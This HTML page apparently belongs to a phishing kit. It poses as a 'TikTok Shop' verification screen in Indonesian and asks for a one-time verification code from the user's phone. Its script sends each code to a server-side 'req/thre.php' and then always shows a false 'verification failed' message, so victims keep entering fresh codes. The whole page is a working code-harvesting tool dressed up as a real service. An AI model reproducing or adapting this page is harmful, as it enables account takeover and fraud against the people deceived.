<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>TikTok Shop</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
    * {
        font-family: 'Ubuntu', sans-serif;
        font-weight: 400;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        position: relative;
        color: #000;
    }
    .b { font-weight: 500; }
    html { width: 100vw; height: 100vh; }
    body {
        background: #fff;
        width: 100%;
        height: 100%;
    }
    .container {
        width: 100%;
        padding: 20px;
        height: 100%;
    }
    .flex {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .hero {
        width: 100%;
        height: 283px;
    }
    .hero img {
        width: 100%;
    }
    h1 {
        font-size: 20px;
        text-align: center;
        margin: 20px 0;
        font-weight: 600;
    }
    form {
        width: 100%;
        height: auto;
        flex-direction: column;
    }
    label {
        display: block;
        font-size: 15px;
        text-align: left;
        margin-bottom: 8px;
        font-weight: 500;
    }
    select {
        width: 100%;
        height: 40px;
        border-radius: 4px;
        padding: 0 10px;
        outline: none;
        border: 1px solid #aeaeae;
        background: #fff;
        margin-bottom: 20px;
    }
    input:focus,
    select:focus {
        border: 1.1px solid #000;
    }
    .wrap {
        width: 100%;
        height: 60px;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .clear {
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 999;
    }
    input {
        width: 100%;
        background: #fff;
        height: 40px;
        border-radius: 4px;
        border: 1px solid #aeaeae;
        outline: none;
        padding: 0 10px;
        font-size: 16px;
        margin-bottom: 20px;
    }
    button {
        margin-top: 10px;
        width: 100%;
        height: 40px;
        border: none;
        outline: none;
        border-radius: 8px;
        color: #fff;
        background: #000;
        text-align: center;
        font-size: 13px;
    }
    .alert {
        width: 100%;
        height: auto;
    }
    p {
        font-size: 15px;
        margin-bottom: 10px;
        color: #6d6d6d;
    }
    button:disabled {
        opacity: 0.6;
    }
</style>
</head>
<body>
    <div class="container">
        <div class="flex hero">
            <img src="img/hero.jpg" alt="">
        </div>
        <div style="display:none;" class="alert">
            <h1 class="">GAGAL VERIFIKASI!</h1>
            <p>Kode yang anda masukkan sudah tidak berlaku, silakan masukkan ulang kode yang terkirim melalui handphone anda</p>
            <button type="button" onclick="resend();">Masukkan ulang</button>
        </div>
        <div class="boxform">
            <h1 class="">TikTok Shop</h1>
            <form id="form" onsubmit="send(event);">
                <label>Kode Verifikasi</label>
            <input class="inpotp" type="number" required autocomplete="off" placeholder="Kode" name="nootp">
                <button id="btn1" type="submit">PROSES</button>
            </form>
        </div>
    </div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    function send(event){
        event.preventDefault();
        $("#btn1").prop("disabled", true);
        $.ajax({
            type: 'POST',
            url: 'req/thre.php',
            data: $('#form').serialize(),
            dataType: 'text',
            success: function(){
                $(".boxform").hide();
                $(".alert").fadeIn(100);
            }
        })
    };
    function resend(){
        $(".alert").hide();
        $(".boxform").fadeIn(200);
        $("#btn1").prop("disabled", false);
        $('.inpotp').val('');
        $(".inpotp").focus()
    }
</script>
